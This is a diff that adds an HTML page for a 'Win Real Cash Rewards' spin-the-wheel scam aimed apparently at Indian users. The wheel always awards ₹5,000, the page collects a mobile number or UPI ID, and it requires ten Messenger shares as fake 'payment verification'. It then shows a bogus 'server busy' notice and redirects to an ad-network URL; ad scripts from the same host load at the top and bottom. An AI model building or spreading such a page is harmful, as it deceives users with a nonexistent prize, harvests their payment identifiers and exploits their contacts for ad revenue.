@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win Real Cash Rewards</title>
+    <style>
+        body {
+            background: #f0f2f5 url('https://www.transparenttextures.com/patterns/cubes.png');
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        .ad-container { margin: 15px 0; width: 320px; height: 50px; z-index: 100; }
+
+        #main-container {
+            text-align: center;
+            background: #ffffff;
+            color: #333;
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            border: 2px solid #27ae60;
+        }
+
+        canvas {
+            border-radius: 50%;
+            transition: transform 4s cubic-bezier(0.1, 0, 0.1, 1);
+            max-width: 100%;
+            height: auto;
+            border: 10px solid #f8f9fa;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        h2 { color: #1b5e20; margin-top: 0; text-transform: uppercase; font-weight: 800; }
+
+        button {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 15px;
+            width: 100%;
+            transition: 0.3s;
+        }
+
+        .btn-spin { background: linear-gradient(135deg, #2ecc71, #27ae60); box-shadow: 0 4px #1e8449; }
+        .btn-spin:active { transform: translateY(4px); box-shadow: 0 0 #1e8449; }
+
+        .btn-redeem { background: #f39c12; }
+        .btn-share { background: #0084FF; }
+        
+        input {
+            padding: 14px;
+            border-radius: 8px;
+            border: 2px solid #27ae60;
+            width: 90%;
+            color: #000 !important;
+            background: #fff !important;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 12px;
+            font-size: 18px;
+        }
+
+        .progress-container {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 12px;
+            margin: 20px 0;
+            height: 30px;
+            overflow: hidden;
+            border: 1px solid #bbb;
+            position: relative;
+        }
+
+        #progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #27ae60, #2ecc71);
+            transition: width 0.5s ease-in-out;
+        }
+
+        #percent-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            line-height: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #000;
+        }
+
+        #error-section {
+            display:none; 
+            color: #b71c1c; 
+            font-weight: bold; 
+            background: #ffebee;
+            padding: 20px; 
+            margin-top: 20px;
+            border-radius: 10px;
+            border: 1px solid #ef9a9a;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="ad-container">
+        <script type="text/javascript">
+            atOptions = { 'key' : '5b144373f99ba044bb218b7887a4143e', 'format' : 'iframe', 'height' : 50, 'width' : 320, 'params' : {} };
+        </script>
+        <script type="text/javascript" src="https://shaggysinner.com/5b144373f99ba044bb218b7887a4143e/invoke.js"></script>
+    </div>
+
+    <div id="main-container">
+        <h2>💰 CASH REWARDS 💰</h2>
+        <p style="color: #666; font-size: 15px;">Win <b>Real Cash</b> directly to your Bank or Wallet!</p>
+
+        <div style="position: relative; width: 250px; height: 250px; margin: 20px auto;">
+            <div style="position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #27ae60; z-index: 10;"></div>
+            <canvas id="wheelCanvas" width="250" height="250"></canvas>
+        </div>
+
+        <button id="spin-btn" class="btn-spin" onclick="startSpin()">SPIN TO WIN ₹₹₹</button>
+
+        <div id="uid-section" style="display:none;">
+            <h3 id="win-text" style="color: #1b5e20;"></h3>
+            <p>Enter <b>Mobile Number / UPI ID</b>:</p>
+            <input type="text" id="player-uid" placeholder="Example: +917428730894 / name@upi">
+            <button class="btn-redeem" onclick="redeem()">WITHDRAW <b>REAL MONEY</b></button>
+        </div>
+
+        <div id="share-section" style="display:none;">
+            <p style="font-weight: bold; margin-bottom: 5px;">Payment Verification</p>
+            <p style="font-size: 13px; color: #444;">Share with 10 Friends/Groups to verify your <b>Real Cash</b> payout.</p>
+            
+            <div class="progress-container">
+                <div id="percent-text">0%</div>
+                <div id="progress-bar"></div>
+            </div>
+            
+            <p id="share-count" style="font-size: 15px; margin-top: 5px;">Verification: <span id="count-num">0</span>/10</p>
+            <button id="share-btn" class="btn-share" onclick="shareToFriends()">SHARE ON MESSENGER</button>
+        </div>
+
+        <div id="error-section">
+            ⚠️ SERVER BUSY!<br>
+            <span style="color: #333; font-size: 13px; font-weight: normal;">Verification successful. Due to high traffic, we are redirecting you to our secure <b>Payment Gateway</b>...</span>
+        </div>
+    </div>
+
+    <div class="ad-container">
+        <script type="text/javascript">
+            atOptions = { 'key' : '5b144373f99ba044bb218b7887a4143e', 'format' : 'iframe', 'height' : 50, 'width' : 320, 'params' : {} };
+        </script>
+        <script type="text/javascript" src="https://shaggysinner.com/5b144373f99ba044bb218b7887a4143e/invoke.js"></script>
+    </div>
+
+<script>
+const canvas = document.getElementById('wheelCanvas');
+const ctx = canvas.getContext('2d');
+const segments = ["₹500", "₹2000", "₹100", "₹5000", "₹50", "₹1000"];
+const colors = ["#1abc9c", "#3498db", "#27ae60", "#f1c40f", "#8e44ad", "#e67e22"];
+let currentRotation = 0;
+let shareClicks = 0;
+const totalNeeded = 10; // Updated to 10
+
+function drawWheel() {
+    const sliceAngle = (2 * Math.PI) / segments.length;
+    for (let i = 0; i < segments.length; i++) {
+        ctx.beginPath();
+        ctx.fillStyle = colors[i];
+        ctx.moveTo(125, 125);
+        ctx.arc(125, 125, 125, i * sliceAngle, (i + 1) * sliceAngle);
+        ctx.fill();
+        ctx.save();
+        ctx.translate(125, 125);
+        ctx.rotate(i * sliceAngle + sliceAngle / 2);
+        ctx.fillStyle = "white";
+        ctx.font = "bold 20px Arial";
+        ctx.fillText(segments[i], 50, 10);
+        ctx.restore();
+    }
+}
+drawWheel();
+
+function startSpin() {
+    document.getElementById('spin-btn').disabled = true;
+    const randomSpin = Math.floor(Math.random() * 360) + 3600; 
+    currentRotation += randomSpin;
+    canvas.style.transform = `rotate(${currentRotation}deg)`;
+    setTimeout(() => {
+        document.getElementById('win-text').innerHTML = "CONGRATS! YOU WON <b>₹5,000 CASH</b>!";
+        document.getElementById('uid-section').style.display = "block";
+        document.getElementById('spin-btn').style.display = "none";
+    }, 4000);
+}
+
+function redeem() {
+    const uid = document.getElementById('player-uid').value;
+    if (uid.length < 5) { alert("Enter a valid Payment ID!"); return; }
+    document.getElementById('uid-section').style.display = "none";
+    document.getElementById('share-section').style.display = "block";
+}
+
+function shareToFriends() {
+    const shareBtn = document.getElementById('share-btn');
+    shareBtn.disabled = true;
+    shareBtn.innerText = "Verifying Share...";
+    
+    window.open("fb-messenger://share/?link=" + encodeURIComponent(window.location.href), "_blank");
+
+    // 5 Second Wait for Percentage Update
+    setTimeout(() => {
+        shareClicks++;
+        let percentage = Math.floor((shareClicks / totalNeeded) * 100);
+        if (percentage > 100) percentage = 100;
+
+        document.getElementById('progress-bar').style.width = percentage + "%";
+        document.getElementById('percent-text').innerText = percentage + "%";
+        document.getElementById('count-num').innerText = shareClicks;
+        
+        shareBtn.disabled = false;
+        shareBtn.innerText = "SHARE ON MESSENGER";
+
+        if (shareClicks >= totalNeeded) {
+            setTimeout(() => {
+                document.getElementById('share-section').style.display = "none";
+                document.getElementById('error-section').style.display = "block";
+                setTimeout(() => {
+                    window.location.href = "https://shaggysinner.com/yg0wbpnd?key=c3cf96e449f8239c296a7f20997be98e";
+                }, 4000);
+            }, 1000);
+        }
+    }, 5000);
+}
+</script>
+</body>
+</html>
